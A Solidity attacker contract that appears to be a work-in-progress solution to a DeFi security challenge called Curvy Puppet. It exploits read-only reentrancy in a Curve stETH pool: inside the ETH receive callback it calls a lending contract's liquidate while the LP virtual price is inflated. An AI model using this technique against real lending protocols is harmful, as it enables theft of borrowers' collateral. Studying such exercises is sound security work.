// SPDX-License-Identifier: MIT

pragma solidity =0.8.25;

import {CurvyPuppetLending} from "../../src/curvy-puppet/CurvyPuppetLending.sol";
import {IStableSwap} from "../../src/curvy-puppet/IStableSwap.sol";
import {console} from "forge-std/console.sol";
import {IERC20} from "@openzeppelin/contracts/interfaces/IERC20.sol";
import {WETH} from "solmate/tokens/WETH.sol";

contract CurvyPuppetAttacker {
    IERC20 stETH;
    WETH weth;
    CurvyPuppetLending public lending;
    IStableSwap public curvePool;
    address[3] public victims;
    bool public isUnwraped;

    constructor(
        CurvyPuppetLending _lending,
        IStableSwap _curvePool,
        IERC20 _stETH,
        WETH _weth,
        address[3] memory _victims
    ) {
        lending = _lending;
        curvePool = _curvePool;
        stETH = _stETH;
        weth = _weth;
        victims = _victims;
    }

    // D = total value of the pool (stEth + eth)
    // D / total supply of LP tokens = virtual price of LP token
    // 1. Totoal supply is reduced but not yet the total value of the pool
    // => virtual price of LP token increases
    function reenterRemoveLiquidity() public {
        // Unrwap weth to exchange it for stETH
        weth.withdraw(weth.balanceOf(address(this)));
        uint256 halfBalance = address(this).balance / 2;
        uint256 stEthReceived = curvePool.exchange{value: halfBalance}(
            0,
            1,
            halfBalance,
            0
        );
        isUnwraped = true;
        // Add liquidity to curve pool
        stETH.approve(address(curvePool), stEthReceived);
        uint256 lpTokensAmount = curvePool.add_liquidity{value: halfBalance}([halfBalance, stEthReceived], 0); // [1.823e20] LP tokens received
        console.log("LP token balance", lpTokensAmount);
        // Remove liquidity from curve pool
        IERC20 lpToken = IERC20(curvePool.lp_token());
        console.log("LP token suppy", lpToken.totalSupply());
        lpToken.approve(address(curvePool), lpTokensAmount);
        console.log("Virtual price before remove liquidity: %s", curvePool.get_virtual_price()); // 1.096890519277164744e18
        curvePool.remove_liquidity_imbalance([1,stEthReceived], type(uint256).max);
    }

    // Balanced
    //Virtual price before remove liquidity: 1096890519277164744
    //Virtual price after remove liquidity: 1098473308660539360

    receive() external payable {
        // 98e18
        if (isUnwraped) {
            console.log("Virtual price after remove liquidity: %s", curvePool.get_virtual_price()); // 1.096890558792385373e18
            lending.liquidate(victims[0]); // Still 3.25 times collateralized
        }
    }
}
